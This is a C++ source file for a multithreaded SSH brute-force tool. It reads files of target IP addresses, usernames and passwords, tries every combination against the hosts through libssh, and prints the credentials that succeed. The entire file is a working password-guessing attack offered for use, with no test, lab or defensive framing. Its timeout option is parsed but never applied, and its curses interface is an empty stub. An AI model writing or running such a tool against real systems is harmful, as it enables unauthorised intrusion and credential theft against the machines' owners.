#include <curses.h>
#include <libssh/libssh.h>
#include <pthread.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <unistd.h>
#include <getopt.h>

#define MAX_THREADS 100
#define UI_WIDTH 80
#define UI_HEIGHT 24

struct BruteForceArgs {
  std::string ip;
  std::string username;
  std::string password;
};

void *attempt_connect(void *args) {
  BruteForceArgs *bfArgs = static_cast<BruteForceArgs*>(args);

  ssh_session session = ssh_new();
  if (session == NULL) {
    std::cerr << "Error: Unable to create SSH session.\n";
    return NULL;
  }

  ssh_options_set(session, SSH_OPTIONS_HOST, bfArgs->ip.c_str());
  ssh_options_set(session, SSH_OPTIONS_USER, bfArgs->username.c_str());

  int rc = ssh_connect(session);
  if (rc != SSH_OK) {
    std::cerr << "Error: Unable to connect to " << bfArgs->ip << "\n";
    ssh_free(session);
    return NULL;
  }

  rc = ssh_userauth_password(session, NULL, bfArgs->password.c_str());
  if (rc == SSH_AUTH_SUCCESS) {
    std::cout << "Success: " << bfArgs->ip << " " << bfArgs->username << " " << bfArgs->password << "\n";
  }

  ssh_disconnect(session);
  ssh_free(session);
  return NULL;
}

void draw_ui(void) {
  // Initialize curses
  initscr();
  cbreak();
  noecho();
  curs_set(0);

  // Create a window for the UI
  WINDOW *win = newwin(UI_HEIGHT, UI_WIDTH, 0, 0);
  box(win, 0, 0);
  wrefresh(win);

  // Clean up
  delwin(win);
  endwin();
}

void print_help() {
  std::cout << "Usage: ssh_bruteforce [OPTIONS]\n";
  std::cout << "Options:\n";
  std::cout << "  --ip-list <file>           File containing IP addresses\n";
  std::cout << "  --user-list <file>         File containing usernames\n";
  std::cout << "  --password-list <file>     File containing passwords\n";
  std::cout << "  --timeout <seconds>        Timeout for each connection attempt\n";
  std::cout << "  --threads <number>         Number of threads to use\n";
  std::cout << "  --help                     Display this help message\n";
}

std::vector<std::string> read_file(const std::string& filename) {
  std::vector<std::string> lines;
  std::ifstream file(filename);
  if (file.is_open()) {
    std::string line;
    while (std::getline(file, line)) {
      lines.push_back(line);
    }
    file.close();
  } else {
    std::cerr << "Error: Unable to open file: " << filename << std::endl;
  }
  return lines;
}

int main(int argc, char *argv[]) {
  int opt;
  std::string ip_list_file;
  std::string user_list_file;
  std::string password_list_file;
  int timeout = 0;
  int threads = 1;

  static struct option long_options[] = {
    {"ip-list", required_argument, 0, 'i'},
    {"user-list", required_argument, 0, 'u'},
    {"password-list", required_argument, 0, 'p'},
    {"timeout", required_argument, 0, 't'},
    {"threads", required_argument, 0, 'n'},
    {"help", no_argument, 0, 'h'},
    {0, 0, 0, 0}
  };

  while ((opt = getopt_long(argc, argv, "i:u:p:t:n:h", long_options, NULL)) != -1) {
    switch (opt) {
      case 'i':
        ip_list_file = optarg;
        break;
      case 'u':
        user_list_file = optarg;
        break;
      case 'p':
        password_list_file = optarg;
        break;
      case 't':
        timeout = std::stoi(optarg);
        break;
      case 'n':
        threads = std::stoi(optarg);
        if (threads > MAX_THREADS) {
          std::cerr << "Error: Maximum threads allowed is " << MAX_THREADS << "\n";
          return 1;
        }
        break;
      case 'h':
        print_help();
        return 0;
      default:
        print_help();
        return 1;
    }
  }

  if (ip_list_file.empty() || user_list_file.empty() || password_list_file.empty()) {
    std::cerr << "Error: Missing required arguments. Use --help for usage.\n";
    return 1;
  }

  std::vector<std::string> ip_list = read_file(ip_list_file);
  std::vector<std::string> user_list = read_file(user_list_file);
  std::vector<std::string> password_list = read_file(password_list_file);

  // Example of how you might initiate threads for brute-forcing
  pthread_t thread_ids[MAX_THREADS];
  int thread_count = 0;

  for (const auto& ip : ip_list) {
    for (const auto& user : user_list) {
      for (const auto& pass : password_list) {
        if (thread_count >= threads) {
          for (int i = 0; i < thread_count; ++i) {
            pthread_join(thread_ids[i], NULL);
          }
          thread_count = 0;
        }

        BruteForceArgs *args = new BruteForceArgs{ip, user, pass};
        pthread_create(&thread_ids[thread_count++], NULL, attempt_connect, args);
      }
    }
  }
  
  for (int i = 0; i < thread_count; ++i) {
    pthread_join(thread_ids[i], NULL);
  }

  draw_ui();
  return 0;
}
